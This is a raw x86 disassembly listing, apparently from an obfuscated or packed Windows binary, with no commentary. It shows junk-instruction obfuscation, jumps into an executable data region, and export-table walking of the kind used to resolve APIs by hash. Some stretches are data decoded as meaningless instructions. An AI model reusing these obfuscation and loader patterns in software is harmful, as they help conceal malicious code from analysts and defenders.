sub_101151c2
mov [ esp + 0x4 ] 0x9d
lea esp [ esp + 0xc ]
je rwxdata
movsx bx dl
ror bh cl
mov bx [ esi ]
push 0x4712b91c
and ebx 0xfff
bt di 0x3
push 0xf783b537
pushfd
add [ ebx + edi ] ax
pushad
pushfd
mov [ esp ] 0xa9
lea esp [ esp + 0x30 ]
jmp sub_101d8368
push esi
cmp ebx 0x2
call sub_1020a42e
sub_101151da
mov [ esp ] 0xbb
pushfd
add edi eax
add esp 0x8
jns rwxdata
push edx
movzx ecx [ edi + ecx * 2 ]
btc edi edx
mov edi [ edx + 0x1c ]
mov [ esp ] 0x37
call sub_101c938c
push 0x1aa87c34
clc
bt esi edi
movzx ecx [ edi + ecx * 2 ]
sub esp 0xfffffffc
xor edi 0x57c199bc
mov edi [ edx + 0x1c ]
push ecx
add edi eax
cmp ebp 0x3522421
mov edi [ edi + ecx * 4 ]
cmc
mov [ esp ] dl
pushad
test edi edi
mov [ esp ] bh
jmp rwxdata
lea esp [ esp + 0x24 ]
jo rwxdata
call sub_1020c122
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pop es
das
dec edi
jbe rwxdata
adc [ ecx + 0x6e6777fb ] 0xda
pop eax
lodsd [ esi ]
jbe rwxdata
bts dx 0x2
xor eax eax
cmp dl bl
add eax edi
stc
clc
cmp eax edx
push 0xf5768585
lea esp [ esp + 0x4 ]
jb rwxdata
pop edx
scasb [ edi ]
nop
das
jo rwxdata
ror [ edx ] cl
add [ eax ] al
add cl ch
xchg ecx eax
sbb eax 0x2ce80000
push edx
pushfd
add eax [ eax ]
add al ch
sub al 0x52
insd
int1
lea esi [ ecx ]
push 0x15
scasb [ edi ]
xor [ ecx ] ebp
jne rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
jge rwxdata
clc
cmp eax [ ebp - 0x10 ]
pushfd
lea esp [ esp + 0x4 ]
jae rwxdata
sbb [ edi - 0x76b7cc4 ] ah
push cs
xchg [ ecx + edx - 0x5f ] ebx
cwde
sub ecx [ ecx ]
pop edx
adc [ edx + esi * 8 ] ecx
add edi ebp
retn 0x66d3
mov cl 0x9
pop ebp
loop rwxdata
or cl 0x3
mov ebx eax
inc cx
bsf di ax
mov edi eax
sar cl 0x3
mov ecx 0x104
cmp si ax
clc
xor al al
jmp sub_101d03b0
add [ 0xffffffffa2930b2e ] ebx
pushfd
ror ebp 0x1
cmp dl [ 0x39866605 ]
mov dl 0x6d
sub_10115228
lea esp [ esp + 0x30 ]
jb rwxdata
jge rwxdata
pushfd
cmp eax [ ebp - 0x10 ]
mov [ esp ] dl
lea esp [ esp + 0x4 ]
jae rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
movzx cx dl
pushad
not di
mov ebx eax
push esp
mov [ esp ] 0xc0
setne ch
pop edi
mov edi eax
pushad
not cx
pop ecx
mov ecx 0x104
push [ esp ]
lea esp [ esp + 0x40 ]
jmp rwxdata
cmp si ax
clc
xor al al
jmp sub_101d03b0
sub_101159bb
push 0x6097ac70
stosb [ edi ]
mov [ esp ] 0xc8
lea esp [ esp + 0x8 ]
jmp rwxdata
pushad
jmp rwxdata
pushfd
pushfd
lea esp [ esp + 0x28 ]
call j_sub_101cb5d7
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
pushad
mov [ esp + 0x10 ] 0x9e
lodsb [ esi ]
rcl bl cl
sub al 0xf8
not bl
setge bl
ror al 0x1
not bl
setno bl
not al
dec bl
shr bl cl
xor al 0xbe
sbb bl dh
push [ esp ]
ror bl cl
jmp rwxdata
cmc
stc
bt ecx ebp
jmp rwxdata
neg al
not bl
pushfd
setne bl
mov bl ah
stosb [ edi ]
jmp rwxdata
xor ecx ecx
jmp rwxdata
push 0xd9d35aa3
mov bl 0x2
lea esp [ esp + 0x2c ]
jmp rwxdata
call j_sub_101cb5d7
jmp j_sub_101d1d2f
sub_10115d2b
add edx eax
push 0xe11ed0f8
pushfd
lea esp [ esp + 0xc ]
jmp rwxdata
mov al al
adc al bh
add edi 0x1
rcr al 0x1
push 0xae313a6d
inc al
add al 0x97
mov al [ edi ]
test bh ah
test al al
push 0x8f16e632
lea esp [ esp + 0x8 ]
je rwxdata
rcr al 0x6
shld ecx ebp cl
mov edi edx
and ecx 0xe1443ac4
jmp rwxdata
clc
clc
stc
sub al 0x30
bt bx si
stc
jmp rwxdata
mov ecx edi
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
cmp al 0x9
pushfd
call sub_101c99ba
shr al 0x3
ror al 0x2
rcr ah cl
mov eax [ ebp - 0x8 ]
test ch 0x99
test esi eax
cmp ah 0x5
cmc
shl eax 0x1
call sub_101bdee6
pushfd
lea edi [ ebx - 0x47c248e ]
movzx esi [ edx + 0x1a ]
pushfd
bswap di
lea esi [ esi + edx + 0x1c ]
jmp rwxdata
pushad
mov edi [ ebp + 0x8 ]
pushfd
call sub_101d96a1
push 0xe5bfe2b4
cmp al 0x9
pushad
lea esp [ esp + 0x24 ]
ja rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
stc
imul edx edx 0xa
jmp rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
add edx eax
push 0x642b6212
push 0x3ff1ecec
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x8 ]
jmp rwxdata
sub_10115e01
call sub_1020c325
push [ esp ]
test edx edx
push 0x33f6edc4
pushfd
jmp rwxdata
lea esp [ esp + 0x10 ]
je rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
not cx
add edx eax
shr ch cl
inc cl
seto ch
inc ecx
mov ecx [ esi + 0x7c ]
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
pushad
sub esp 0xffffffe0
jbe rwxdata
pushfd
add ecx edx
mov [ esp ] dl
mov [ ebp - 0x10 ] ecx
rcr cl cl
xor cx di
mov ecx [ ebp + 0xc ]
pushad
push eax
cmp ecx 0xffff
jmp rwxdata
pushad
add ecx edx
pushfd
bt bx 0xc
mov [ ebp - 0x10 ] ecx
xor ecx eax
pushad
or ch bh
mov ecx [ ebp + 0xc ]
stc
cmc
cmp ecx 0xffff
mov [ esp ] bx
lea esp [ esp + 0x44 ]
jbe rwxdata
lea esp [ esp + 0x28 ]
jbe rwxdata
call sub_101bde94
push cs
imul [ eax ]
mov dl 0xcd
lodsd [ esi ]
shl edx 0x1
sahf
je rwxdata
bts bx bp
sub ecx eax
shr di 0x3
mov edi [ edx + 0x24 ]
not ch
movzx bx al
stc
btr ecx 0x13
add edi eax
bts bx 0xe
btr bx si
bsf bx sp
test bh 0x64
mov ebx [ edx + 0x20 ]
sbb ch 0xe7
add ebx eax
call sub_101cee1a
dec esi
inc ebp
push esp
inc ecx
push eax
dec ecx
xor esi [ edx ]
insb
insb
add [ ebp - 0x70af4818 ] ch
jmp rwxdata
bsf di bp
pushad
inc ch
mov edi [ edx + 0x24 ]
sar bx cl
add edi eax
inc cl
or ch 0x38
shl bl 0x6
mov ebx [ edx + 0x20 ]
shrd cx bx 0x6
bsr cx di
add ebx eax
shl ch 0x1
inc ch
xor ch 0x29
cmp cl 0x61
mov [ ebp - 0x8 ] 0x0
movsx cx al
rol ch cl
mov ecx [ edx + 0x18 ]
stc
stc
stc
cmp ecx [ ebp - 0x8 ]
pushad
lea esp [ esp + 0x40 ]
jbe rwxdata
and al 0x3b
sbb eax [ ebx - 0x52 ]
push edi
test al 0x97
ja rwxdata
sbb eax 0x1b3b242b
inc ebx
scasb [ edi ]
or al 0x89
dec ebp
xor di 0xb267
sub ecx 0x1
rcr si 0xe
adc di 0xc5b8
adc esi esp
btr si dx
mov [ ebp - 0x4 ] ecx
shl esi cl
clc
mov ecx [ ebp - 0x8 ]
shld esi edx 0x10
shld di bx 0x1
add ecx [ ebp - 0x4 ]
stc
adc di 0x6a5d
clc
xor di 0x8f9a
shr ecx 0x1
movzx si bl
btr di 0x7
shl di cl
mov edi [ ebx + ecx * 4 ]
push ebp
neg si
movsx si bl
add edi eax
pushad
jmp rwxdata
jg rwxdata
push edi
dec eax
fwait
mov esi [ ebp + 0xc ]
call sub_101d6a53
mov al [ edi ]
test eax 0x8a3ed1e3
test al al
pushfd
push 0x2d98198a
mov [ esp ] ah
pushfd
lea esp [ esp + 0xc ]
je rwxdata
push ebp

xor cl [ 0x39a53576 ]
push es
js rwxdata
rcr al 0x6
shld ecx ebp cl
mov edi edx
and ecx 0xe1443ac4
jmp rwxdata
cmc
cmc
sub al 0x30
push ebp
mov [ esp ] 0xf5ab
mov [ esp ] 0xa3
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
inc ebx
arpl [ esp + eax ] di
add eax esi
adc eax 0x425a06f8
je rwxdata
mov ecx edi
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
bt bx si
stc
jmp rwxdata
loop rwxdata
0x777a0467 0x638e
cmp al 0x9
pushfd
call sub_101c99ba
shr al 0x3
ror al 0x2
rcr ah cl
mov eax [ ebp - 0x8 ]
test ch 0x99
test esi eax
cmp ah 0x5
cmc
shl eax 0x1
call sub_101bdee6
pushfd
lea edi [ ebx - 0x47c248e ]
movzx esi [ edx + 0x1a ]
pushfd
bswap di
lea esi [ esi + edx + 0x1c ]
jmp rwxdata
and al 0x92
insb
fwait
inc esp
sub eax 0x7af1ae11
and eax 0x815e69b6
salc
fcmovb st4
aad 0xff
mov [ eax - 0x54ec78e6 ] cl
test [ ebx + 0x1e1e282 ] bl
sub ecx [ ebx ]
cld
and esi [ edx + ebp * 2 ]
push esp
push 0x70aa5549
outsd
cmp cl 0xfd
retn 0xf140
add [ ebx ] ebp
or edi esp
pushad
mov edi [ ebp + 0x8 ]
pushfd
call sub_101d96a1
push 0xe5bfe2b4
cmp al 0x9
pushad
lea esp [ esp + 0x24 ]
ja rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
stc
imul edx edx 0xa
jmp rwxdata
jmp rwxdata
add edx eax
push 0x642b6212
push 0x3ff1ecec
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x8 ]
jmp rwxdata
mov al al
adc al bh
add edi 0x1
rcr al 0x1
push 0xae313a6d
inc al
add al 0x97
mov al [ edi ]
test bh ah
test al al
push 0x8f16e632
lea esp [ esp + 0x8 ]
je rwxdata
clc
clc
stc
sub al 0x30
sub_101b8282
lea esp [ esp + 0x28 ]
je rwxdata
lea esi [ 0xffffffffc081b206 ]
pop esi
movzx di al
xchg di bx
pop edi
mov ch 0x31
pushfd
mov ebx [ esp + 0x4 ]
not cx
pushad
bswap cx
movzx cx cl
mov ecx [ esp + 0x28 ]
push 0x3aa792c6
mov esp ebp
bswap ebp
call sub_101bc9c8
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
cmp al al
bt bx cx
or ecx ecx
pushfd
mov [ esp ] ebx
jmp rwxdata
pushfd
cmp dh ah
mov [ esp ] al
push esp
add ecx 0xffffffff
pushfd
lea esp [ esp + 0xc ]
je rwxdata
jmp rwxdata
lea esp [ esp + 0x4 ]
je rwxdata
push 0x85a0923c
sub eax eax
sub esp 0xfffffffc
cmp dl bl
cmc
stc
add edx 0x11c
push ebp
pushad
pushfd
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
lea eax [ eax * 8 + 0x76abfba ]
mov eax [ edx + 0x8 ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
push 0x50c5438d
cmc
setns ch
xor ebx ebx
pop ecx
not cl
mov [ ebp - 0x4 ] ebx
shld cx si cl
xadd cl al
aad 0x1
jmp rwxdata
push esp
jmp rwxdata
pushfd
call sub_101d91e6
mov eax edx
cmc
pushad
shl cl 0x6
shr eax 0x10
sub esp 0xffffffe0
rcr ch 0x3
test sp 0x654e
mov ecx [ esi + 0x4 ]
push edi
mov [ esp ] dx
or ecx ecx
call sub_101bc663
sbb [ 0xffffffffa35e412a ] dh
sbb ebp [ esi + esi * 2 ]
imul ebp [ ebp + 0x64e41d6e ] 0xb42a6857
cmp eax 0xe6b867c8
mov eax 0xa897bcc2
push esi
dec ecx
lds ebx [ ecx - 0xf ]
lodsd [ esi ]
or ebp esi
xor [ cs : ecx ] ebx
inc esi
push edi
xchg esp eax
stosb [ edi ]
mov ebx 0x820e9d61
mov [ 0xffffffffacb3b5ec ] eax
in eax dx
int1
fistp [ esi + esi * 8 ]
inc eax
arpl [ edx + 0x4c ] si
pop ebp
salc
outsd
iretd
xchg si di
movzx esi [ edx + 0x1a ]
push [ esp ]
lea esi [ esi + edx + 0x1c ]
movsx di dl
push [ esp + 0x4 ]
mov di 0x7f34
mov edi [ ebp + 0x8 ]
jmp sub_101bdb2a
sub_101b837c
mov bl 0x2
push edx
sete al
setpe al
inc ecx
not al
jmp rwxdata
mov [ esp ] dl
mov al 0x10
push 0xd8d7d138
jmp rwxdata
pushad
lea esp [ esp + 0x30 ]
call j_sub_101cb5d7
pushad
call sub_10115428
0xc8f7a8d7 0xb867
stc
push esi
popad
jns rwxdata
pop ecx
shl [ edx + edi * 2 - 0x45 ] 0x1
cmpsd [ esi ] [ edi ]
ja rwxdata
shr cl 0x1
xchg ebp eax
dec eax
push esi
inc edi
mov esi 0x3ea0f2ad
or bh dl
mov ebx 0x7f643b84
inc eax
out dx al
jo rwxdata
adc dh cl
fild [ esi ]
cmp eax 0x395af148
movsd [ edi ] [ esi ]
add ebp ebx
mov ch 0xea
and ebx ebx
dec ebx
hlt
jg rwxdata
adc ebp [ ecx + 0x5d ]
mov cl 0xfc
add esp 0x13
mov dl 0xaa
loope rwxdata
das
iretd
insb
xor eax 0x235aa469
pop ebx
xchg [ eax - 0x22be72af ] bl
out dx al
jno rwxdata
and ebx [ ebx - 0x7a ]
cwde
push ecx
lea eax [ ecx - 0x23 ]
out 0x79 al
push ecx
int 0xde
push ds
aad 0xf4
sbb [ ebx + 0x18 ] ebx
js rwxdata
test [ ebx ] bh
jg rwxdata
cmp eax 0x843b800f
pushfd
cmp dh ah
mov [ esp ] al
push esp
add ecx 0xffffffff
pushfd
lea esp [ esp + 0xc ]
je rwxdata
retn 0x50
salc
cmpsd [ esi ] [ edi ]
xlat
mov esi 0x844cc6b9
cdq
or eax 0x4ba1a638
xor [ ebx - 0x35 ] esp
out dx al
in eax 0xa2
fimul [ ebp + 0x46 ]
retn 0xfc0d
jbe rwxdata
push 0x85a0923c
sub eax eax
sub esp 0xfffffffc
pushfd
call sub_101d91e6
cmp dl bl
cmc
stc
add edx 0x11c
push ebp
pushad
pushfd
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
push esp
jmp rwxdata
xchg si di
movzx esi [ edx + 0x1a ]
push [ esp ]
lea esi [ esi + edx + 0x1c ]
movsx di dl
push [ esp + 0x4 ]
mov di 0x7f34
mov edi [ ebp + 0x8 ]
jmp sub_101bdb2a
sub_101b875b
adc ecx ecx
pushad
lea esp [ esp + 0x24 ]
jmp rwxdata
setpe bl
setns bl
inc ecx
pushfd
inc bl
inc ecx
sub esp 0xfffffffc
not bl
shl bl 0x4
shl bl 0x3
xchg ebp eax
clc
movsx ax al
mov eax ebp
neg bl
mov bl 0x1
pushfd
jmp rwxdata
cmp dh 0xab
xchg [ esp ] esi
pushad
ror si cl
btc esi esp
mov esi edi
stc
call sub_101d929d
test bl dh
call sub_101be430
cli
push esi
sub [ edx ] cl
xor al 0x7f
pushad
mov eax [ 0x5e0a74cc ]
0xa151a44 0x1ee7
sub_101b89d4
mov edi [ edi + ecx * 4 ]
cmp ah al
test ax 0xa966
mov [ esp + 0x8 ] dl
pushfd
test edi edi
pushfd
mov [ esp + 0x34 ] dl
pushfd
lea esp [ esp + 0x3c ]
je rwxdata
bts dx 0x2
xor eax eax
cmp bl 0xc3
stc
bt di sp
add eax edi
clc
cmp bl dl
pushad
cmc
cmp eax edx
pushfd
lea esp [ esp + 0x24 ]
jb rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
jge rwxdata
cmc
jmp rwxdata
clc
cmp eax [ ebp - 0x10 ]
pushfd
jmp rwxdata
lea esp [ esp + 0x4 ]
jae rwxdata
xadd di cx
pushfd
mov ebx eax
clc
cmp sp ax
xadd cx di
sbb ch 0x2c
mov edi eax
ror ch cl
bt cx di
inc cl
neg cl
mov ecx 0x104
cmc
bt cx bx
sub al al
pushfd
mov [ esp ] dh
push ebx
bt esi esp
[ edi ]
pushad
lea esp [ esp + 0x2c ]
jne rwxdata
sar ch cl
test ch bl
xadd cx si
mov ecx edi
pushad
mov [ esp ] 0x4fbe
sub si 0xaf56
jmp rwxdata
sub ecx ebx
cmc
sbb si 0x57a3
lea esi [ esp + 0x20 ]
jmp sub_101d8988
sub_101b8c64
cmp al 0x41
pushfd
lea esp [ esp + 0x8 ]
jb rwxdata
ror ah 0x4
adc ah al
cmp edi ebx
shl ah 0x7
mov ah [ esi ]
cmc
stc
jmp rwxdata
cmp dh bh
cmp al 0x5a
jmp rwxdata
pushfd
cmp ah 0x41
pushfd
call sub_1020b43b
pushad
pushad
mov [ esp ] 0x11
lea esp [ esp + 0x40 ]
ja rwxdata
pushfd
add al 0x20
lea esp [ esp + 0x4 ]
sub_101baf81
mov [ esp ] 0x9a
lea eax [ LocalAlloc@IAT ]
pushfd
call sub_101d52f4
mov [ esp ] 0xb
movzx ax cl
lea eax [ rwxdata ]
pushad
pushad
mov [ esp + 0x3c ] rwxdata
push eax
mov [ esp + 0x8 ] dh
push [ eax ]
pop [ esp + 0x3c ]
pushfd
pushfd
push [ esp + 0x44 ]
retn 0x48
sub_101bb2f6
mov [ esp ] 0x3f
lea esp [ esp + 0x8 ]
je rwxdata
movsx bx dl
ror bh cl
mov bx [ esi ]
push 0x4712b91c
and ebx 0xfff
bt di 0x3
push 0xf783b537
pushfd
add [ ebx + edi ] ax
pushad
pushfd
mov [ esp ] 0xa9
lea esp [ esp + 0x30 ]
jmp sub_101d8368
stc
cmp ebx 0x2
call sub_1020bd8d
jmp rwxdata
pushad
mov [ esp + 0x14 ] dh
imul edx edx 0xa
push 0x1a7221ac
cmc
add edx eax
pushad
mov [ esp + 0x4 ] 0xa8
mov [ esp ] 0x1bff
push 0x6c74f70c
lea esp [ esp + 0x48 ]
jmp rwxdata
mov al al
adc al bh
add edi 0x1
rcr al 0x1
push 0xae313a6d
inc al
add al 0x97
mov al [ edi ]
test bh ah
test al al
push 0x8f16e632
lea esp [ esp + 0x8 ]
je rwxdata
rcr al 0x6
shld ecx ebp cl
mov edi edx
and ecx 0xe1443ac4
jmp rwxdata
clc
clc
stc
sub al 0x30
bt bx si
stc
jmp rwxdata
mov ecx edi
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
cmp al 0x9
pushfd
call sub_101c99ba
shr al 0x3
ror al 0x2
rcr ah cl
mov eax [ ebp - 0x8 ]
test ch 0x99
test esi eax
cmp ah 0x5
cmc
shl eax 0x1
call sub_101bdee6
pushfd
lea edi [ ebx - 0x47c248e ]
movzx esi [ edx + 0x1a ]
pushfd
bswap di
lea esi [ esi + edx + 0x1c ]
jmp rwxdata
pushad
mov edi [ ebp + 0x8 ]
pushfd
call sub_101d96a1
push 0xe5bfe2b4
cmp al 0x9
pushad
lea esp [ esp + 0x24 ]
ja rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
stc
imul edx edx 0xa
jmp rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
add edx eax
push 0x642b6212
push 0x3ff1ecec
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x8 ]
jmp rwxdata
sub_101bb3cf
clc
pushfd
test ah ah
jmp rwxdata
jmp rwxdata
push [ esp + 0x4 ]
lea esp [ esp + 0x38 ]
jne rwxdata
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
pushfd
mov [ esp ] ch
jmp rwxdata
mov [ esp ] edi
push 0x1bbfb9c6
pushad
mov [ esp ] cl
mov [ esp + 0x20 ] ebx
mov [ esp + 0x10 ] 0x29
lea esp [ esp + 0x20 ]
call sub_101d714b
jg rwxdata
jmp rwxdata
pushad
push 0x709d80ee
mov esp esi
pushad
pushad
push esp
mov [ esp ] 0x84b6
lea esp [ esp + 0x44 ]
jmp rwxdata
mov esp esi
pushad
pushad
push [ esp + 0x8 ]
mov [ esp ] 0x21c2
lea esp [ esp + 0x44 ]
jmp rwxdata
jge rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub_101bb48b
pushfd
jmp rwxdata
lea esp [ esp + 0x8 ]
ja rwxdata
cmp ax 0x4037
stc
pushfd
or al al
pushfd
lea esp [ esp + 0x8 ]
je rwxdata
stc
stc
add ah 0x20
jmp rwxdata
push 0xc5f88448
mov [ esp ] 0xed25
test sp 0x9ab3
bt di 0x4
or ah ah
jmp j_sub_101bc751
jmp rwxdata
bt sp bp
test dl 0x4f
or al al
pushfd
lea esp [ esp + 0x4 ]
je rwxdata
test cx dx
pushad
test bl 0x6
cmp al ah
mov [ esp + 0x1c ] bl
lea esp [ esp + 0x20 ]
jg rwxdata
jmp rwxdata
jmp rwxdata
jne rwxdata
pushad
pushad
cmp al ah
call sub_101cf47c
call sub_101d410a
push edi
xchg [ edi ] edx
xchg [ ebx - 0x5c ] ebx
sbb al 0x2
ror [ eax ] 0x1
push ds
dec ebx
std
inc [ eax ]
lodsd [ esi ]
pop eax
fisub [ ebx + 0x3c ]
retn
push edx
lea esp [ esp + 0x4 ]
jne rwxdata
pushad
call sub_1020a43d
push eax
push 0x56f38b65
jmp rwxdata
pushad
jmp rwxdata
inc esi
mov [ esp + 0x4 ] ch
inc edi
pushad
mov [ esp + 0x10 ] si
pushfd
pushfd
lea esp [ esp + 0x30 ]
jmp sub_101d8396
inc esi
push edx
mov [ esp ] 0x7421
inc edi
mov [ esp + 0xc ] bh
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp sub_101d8396
sub_101bba4f
push 0x123d65ed
push [ esp ]
pushad
lea esp [ esp + 0x30 ]
jb rwxdata
jge rwxdata
bt ebp 0x8
cmp eax [ ebp - 0x10 ]
pushad
pushfd
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
lea esp [ esp + 0x24 ]
jae rwxdata
neg bl
mov ebx eax
inc cx
and di 0x8588
adc di bp
mov edi eax
btc ecx 0x8
rcl cl 0x3
mov ecx 0x104
pushfd
test bh 0x45
bt si 0x9
clc
sub al al
push [ esp ]
test cx 0x23ea
cmp al 0x95
[ edi ]
pushfd
jmp rwxdata
jmp rwxdata
lea esp [ esp + 0xc ]
jne rwxdata
bts dx 0x2
xor eax eax
not ch
mov ecx edi
bt sp 0x1
rcl si 0xc
call $+5
neg esi
sub ecx ebx
pop esi
sub esi 0xde882eae
inc si
mov esi esp
test ebp 0x4fdd4ede
cmc
sub edi 0x4
call sub_101e3f41
lea esp [ esp + 0x8 ]
ja rwxdata
cmp ax 0x4037
stc
pushfd
or al al
pushfd
lea esp [ esp + 0x8 ]
je rwxdata
stc
stc
add ah 0x20
jmp rwxdata
push 0xc5f88448
mov [ esp ] 0xed25
test sp 0x9ab3
bt di 0x4
or ah ah
jmp j_sub_101bc751
jmp rwxdata
bt sp bp
test dl 0x4f
or al al
pushfd
lea esp [ esp + 0x4 ]
je rwxdata
test cx dx
pushad
test bl 0x6
cmp al ah
mov [ esp + 0x1c ] bl
lea esp [ esp + 0x20 ]
jg rwxdata
jmp rwxdata
jmp rwxdata
jne rwxdata
pushad
pushad
cmp al ah
call sub_101cf47c
call sub_101d410a
push edi
xchg [ edi ] edx
xchg [ ebx - 0x5c ] ebx
sbb al 0x2
ror [ eax ] 0x1
push ds
dec ebx
std
inc [ eax ]
lodsd [ esi ]
pop eax
fisub [ ebx + 0x3c ]
retn
push edx
lea esp [ esp + 0x4 ]
jne rwxdata
pushad
call sub_1020a43d
push eax
push 0x56f38b65
jmp rwxdata
pushad
jmp rwxdata
inc esi
mov [ esp + 0x4 ] ch
inc edi
pushad
mov [ esp + 0x10 ] si
pushfd
pushfd
lea esp [ esp + 0x30 ]
jmp sub_101d8396
inc esi
push edx
mov [ esp ] 0x7421
inc edi
mov [ esp + 0xc ] bh
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp sub_101d8396
sub_101bc325
lea esp [ esp + 0x4c ]
call j_sub_101cb5d7
push 0x2947da23
adc ecx ecx
pushfd
call sub_101d91fe
call sub_101d2802
xchg [ ebx ] ax
pushfd
mov [ esp ] 0x77
pushfd
pushfd
mov [ esp + 0x8 ] 0x7a37ca92
call sub_101d7b15
sub_101bc357
mov ecx [ esp + 0x38 ]
lea esp [ esp + 0x3c ]
ja rwxdata
jmp rwxdata
push 0x93a1716e
mov esp ebp
movzx bp cl
pop ebp
push ebp
push [ esp + 0x4 ]
retn 0x18
pushfd
push 0x53c8fd3a
push 0x7b3ba954
mov esp ebp
lea ebp [ esp - 0x1851291f ]
pop ebp
pushad
push 0x20939adc
push [ esp + 0x24 ]
retn 0x38
sub_101bc637
pushfd
lea esp [ esp + 0x10 ]
jne rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
pushfd
lahf
lahf
lea eax [ ebp + 0x18278fba ]
mov [ edi - 0x1 ] 0x0
setne ah
mov [ esp ] ebx
not ax
lea eax [ rwxdata ]
call sub_101d2e40
bts dx 0x2
xor eax eax
jge rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub_101bc663
lea esp [ esp + 0x8 ]
je rwxdata
lea esi [ 0xffffffffc081b206 ]
pop esi
movzx di al
xchg di bx
pop edi
mov ch 0x31
pushfd
mov ebx [ esp + 0x4 ]
not cx
pushad
bswap cx
movzx cx cl
mov ecx [ esp + 0x28 ]
push 0x3aa792c6
mov esp ebp
bswap ebp
call sub_101bc9c8
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
cmp dl 0x55
shld di bx cl
add [ ebp - 0x4 ] ecx
test dh 0xde
sub ecx 0x8
neg di
shr ecx 0x1
rcl bl cl
mov edi [ esi ]
or bx 0x73a6
test bh ch
shl bl 0x1
bts bx 0x7
add edi [ ebp + 0x10 ]
shl bh 0x3
add esi 0x8
and bx ax
add bh bh
mov bx [ esi ]
jg rwxdata
pushfd
cmp dh ah
mov [ esp ] al
push esp
add ecx 0xffffffff
pushfd
lea esp [ esp + 0xc ]
je rwxdata
jmp rwxdata
jmp rwxdata
shr ebx 0xc
pushfd
stc
cmc
cmp ebx 0x1
call sub_101bb2f6
sbb eax 0x27784757
xchg [ edi - 0x40 ] bh
and esi edi
outsb
adc ah [ esi - 0x1b84c2f5 ]
and edi [ esi + edi * 4 - 0x29a29d40 ]
mov [ ebp - 0x7f ] ebx
push 0x85a0923c
sub eax eax
sub esp 0xfffffffc
cmp dl bl
cmc
stc
add edx 0x11c
push ebp
pushad
pushfd
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
lea eax [ eax * 8 + 0x76abfba ]
mov eax [ edx + 0x8 ]
pushfd
